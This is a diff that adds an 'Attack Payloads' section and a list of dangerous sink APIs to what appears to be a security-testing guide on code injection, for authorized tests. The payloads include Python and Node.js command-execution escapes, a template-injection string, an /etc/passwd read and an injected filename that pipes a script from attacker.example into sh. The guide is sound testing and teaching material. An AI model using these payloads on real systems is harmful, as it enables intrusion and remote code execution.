@@ -32,6 +32,122 @@ The unsafe assumption is that the string passed to a dangerous function is alway
 | **Template logic** | Jinja2 unsafe extensions, Velocity user templates, server-side scriptlets |
 | **Deserialization overlap** | Native object deserialization treated as dynamic instantiation (see deserialization chapter) |
 
+## Attack Payloads
+
+Use these in authorized tests when input reaches dynamic execution or shell invocation. Syntax varies by language and sandbox—confirm the sink before relying on a single payload.
+
+### Pattern 1: Python expression injection (`eval` / `exec`)
+
+```python
+__import__('os').system('id')
+().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id')
+open('/etc/passwd').read()
+```
+
+### Pattern 2: JavaScript code injection
+
+```javascript
+process.mainModule.require('child_process').execSync('id')
+global.process.mainModule.constructor._load('child_process').exec('id')
+Function('return this')().constructor.constructor('return process')().mainModule.require('child_process').execSync('id')
+```
+
+### Pattern 3: Shell metacharacters (when `shell=True` or `-c`)
+
+```text
+report.pdf; curl https://attacker.example/s.sh | sh
+$(whoami)
+`id`
+```
+
+### Pattern 4: Template injection (server-side)
+
+```text
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+${7*7}  # probe for expression evaluation
+```
+
+### Pattern 5: Reflection / dynamic class loading
+
+```text
+className=java.lang.Runtime
+module=../../../evil
+plugin=attacker.jar
+```
+
+### Pattern 6: Pickle / Java deserialization gadgets
+
+Pickle and Java native serialization require crafted binary payloads (ysoserial, pickle gadgets)—test only in isolated lab environments with known gadget chains on the classpath.
+
+## Language-Specific Sinks and Dangerous APIs
+
+### Python
+
+```python
+eval(user_input)
+exec(code)
+compile(source, "<string>", "exec")
+pickle.loads(data)
+yaml.load(data)  # unsafe loader
+subprocess.run(cmd, shell=True)
+importlib.import_module(user_module)
+```
+
+Also review: `simpleeval` misconfiguration, Jinja2 `Environment(autoescape=False)` with user templates, `ast.literal_eval` on untrusted but crafted literals.
+
+### Java
+
+```java
+scriptEngine.eval(userExpr);
+Runtime.getRuntime().exec("cmd " + userInput);
+ProcessBuilder("/bin/sh", "-c", userCmd);
+Class.forName(className).getMethod(method).invoke(...);
+ObjectInputStream.readObject();
+MethodHandles.lookup().findClass(userClass);
+```
+
+Nashorn/GraalJS `ScriptEngine`, Spring SpEL `parseExpression` on user input, MyBatis `${}` (string substitution).
+
+### C#
+
+```csharp
+CSharpScript.EvaluateAsync(userInput);
+CodeDomProvider.CompileAssemblyFromSource(..., userCode);
+Process.Start("cmd.exe", $"/c {userCmd}");
+BinaryFormatter.Deserialize(stream);
+Assembly.Load(userBytes);
+```
+
+Also review: Roslyn scripting, `DataContractSerializer` with known types expanded from user input.
+
+### JavaScript (Node.js)
+
+```javascript
+eval(expr);
+new Function('return ' + userCode)();
+vm.runInNewContext(userCode);  // insufficient isolation alone
+child_process.exec(`cmd ${userInput}`);
+setTimeout(userString, 100);
+require(userPath);
+```
+
+### Go
+
+```go
+vm.Run(userJavaScript)  // otto, goja
+exec.Command("sh", "-c", userCmd)
+plugin.Open(userSuppliedPath)
+text/template.Execute(tmpl, userData)  // when tmpl is user-controlled
+```
+
+### Shell
+
+```bash
+eval "$user_filter"
+source "$uploaded_script"
+bash -c "$user_cmd"
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
